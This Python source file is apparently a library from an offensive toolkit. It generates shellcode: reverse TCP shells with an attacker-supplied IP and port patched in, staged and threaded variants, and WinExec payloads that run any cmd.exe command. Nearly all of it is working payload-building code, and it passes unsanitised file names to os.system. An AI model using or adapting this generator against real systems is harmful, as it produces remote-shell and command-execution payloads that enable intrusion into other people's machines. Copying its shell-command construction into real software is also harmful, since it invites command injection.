'''
A Library to work around shellcodes.
-class SHELLCODE
-LibShellcode.SHELLCODE ReadSHELLCODE(inputFile: str)
-LibShellcode.SHELLCODE GenerateCDRTShell(Ip: str, Port: str)
-LibShellcode.SHELLCODE GenerateCDRTS()
-LibShellcode.SHELLCODE GenerateCDRTTShell()
-LibShellcode.SHELLCODE GenerateWinExec(command: str)
'''
from SRC import LibDebug
import sys
import binascii
import os
import re


class SHELLCODE:
        '''
        SHELLCODE Class.
        -string GetShellcode()
        '''

        def __init__(self):
            self.opcodes = []

        def GetShellcode(self):
            '''
            return shellcode parsed string
            -return: string
            '''
            shellcode = ""
            for opcode in self.opcodes:
                shellcode += opcode
            return shellcode


def ReadSHELLCODE(inputFile: str):
    '''
    Read one ASM file and return a SHELLCODE object
    -return SHELLCODE
    '''
    os.system("nasm -f elf " + inputFile +
              " -o shellcode.o & ld -o shellcode shellcode.o & objdump -d shellcode > shellcode.sc")
    unparsed_shellcode = ""
    shellcode = SHELLCODE()
    with open("shellcode.sc", 'r') as fc:
        unparsed_shellcode = fc.readlines()
    os.system("rm shellcode*")
    for line in unparsed_shellcode:
        line = line.split('\t')
        if len(line) == 3:
            shellcode.opcodes.append(line[1].replace(" ", ""))
    BadEnd = True
    while BadEnd:
        if shellcode.opcodes[len(shellcode.opcodes)-1] == "0000" or shellcode.opcodes[len(shellcode.opcodes)-1] == "00" or shellcode.opcodes[len(shellcode.opcodes)-1] == "ff" or shellcode.opcodes[len(shellcode.opcodes)-1] == "ff00" or shellcode.opcodes[len(shellcode.opcodes)-1] == "00ff" or shellcode.opcodes[len(shellcode.opcodes)-1] == "ffff":
            shellcode.opcodes.pop(len(shellcode.opcodes)-1)
        else:
            BadEnd = False
    return shellcode


def GenerateCDRTShell(Ip: str, Port: str):
    '''
    Generate a Dynamic Reverse TCP Staged shellcode.
    -return string
    '''
    HexIp = LibDebug.IpToHex(Ip)
    HexPort = LibDebug.PortToHex(Port)
    Content = ""
    with open(".\ASM/ShellCodes/Custom_Dynamic_ReverseTCP_Shell.asm", mode='r+') as f:
        Content = f.read()
    NullByteTrigger = False
    for i in range(0, len(HexIp), 2):
        if HexIp[i:i+2] == "00":
            NullByteTrigger = True
            break
    if NullByteTrigger:
            HexIp = str(hex(int("ffffffff", 16) - int(HexIp, 16)))[2:]
            HexPort = str(hex(int("ffff", 16) - int(HexPort, 16)))[2:]
            Content = Content.replace(
                'sub ebx, 0xfeffff80 ; ANDROS03 IP', "sub ebx, 0x" + HexIp + "; ANDROS03 IP")
            Content = Content.replace(
                'sub bx, 0x47DD ; ANDROS07 PORT', "sub bx, 0x" + HexPort + "; ANDROS07 PORT")
    else:
        for i in range(0, len(Content)):
            Content = Content.replace('xor ebx,ebx ; ANDROS01', "; ANDROS01")
            Content = Content.replace(
                'mov ebx, 0xffffffff ; ANDROS02', "; ANDROS02")
            Content = Content.replace(
                'sub ebx, 0xfeffff80 ; ANDROS03', "; ANDROS03")
            Content = Content.replace('push ebx ; ANDROS04', "; ANDROS04")
            Content = Content.replace('xor ebx,ebx ; ANDROS05', "; ANDROS05")
            Content = Content.replace(
                'mov ebx, 0xffffffff ; ANDROS06', "; ANDROS06")
            Content = Content.replace(
                'sub bx, 0x47DD ; ANDROS07 PORT', "; ANDROS07")
            Content = Content.replace('push bx ; ANDROS08', "; ANDROS08")
            Content = Content.replace('; ANDROS09', "push 0x" + HexIp)
            Content = Content.replace('; ANDROS10', "push word 0x" + HexPort)
    File = open("shellcode.asm", "w+")
    File.write(Content)
    File.close()
    return ReadSHELLCODE("shellcode.asm")


def GenerateCDRTS():
    '''
    Generate a Dynamic Reverse TCP Staged shellcode.
    -return string
    '''
    return ReadSHELLCODE(".\ASM/ShellCodes/Custom_Dynamic_ReverseTCP_Staged.asm")


def GenerateCDRTTShell():
    '''
    Generate a Dynamic Reverse TCP Threaded Shell shellcode.
    -return string
    '''
    return ReadSHELLCODE(".\ASM/ShellCodes/Custom_Dynamic_ReverseTCP_Threaded_Shell.asm")


def GenerateWinExec(command: str):
    '''
    Generate a WinExec("cmd.exe /C {command}") shellcode.
    -return string
    '''
    HexCommand = LibDebug.StringToHex(LibDebug.RevertString(command))
    ParsedHexCommand = ""
    while len(HexCommand) % 8 != 0:
        HexCommand = "20" + HexCommand
    ebyte = ""
    for nibble in HexCommand:
        ebyte += nibble
        if len(ebyte) == 8:
            ParsedHexCommand += "push 0x" + ebyte + " ;" + \
                bytearray.fromhex(ebyte).decode()+"\n"
            ebyte = ""
    Content = ""
    with open(".\ASM/ShellCodes/Custom_Dynamic_WinExec.asm", mode='r+') as f:
        Content = f.read()
    for i in range(0, len(Content)):
        if 'push 0x636c6163 ; clac' in Content:
            Content = Content.replace(
                'push 0x636c6163 ; clac', ParsedHexCommand)
    File = open("shellcode.asm", "w+")
    File.write(Content)
    File.close()
    return ReadSHELLCODE("shellcode.asm")
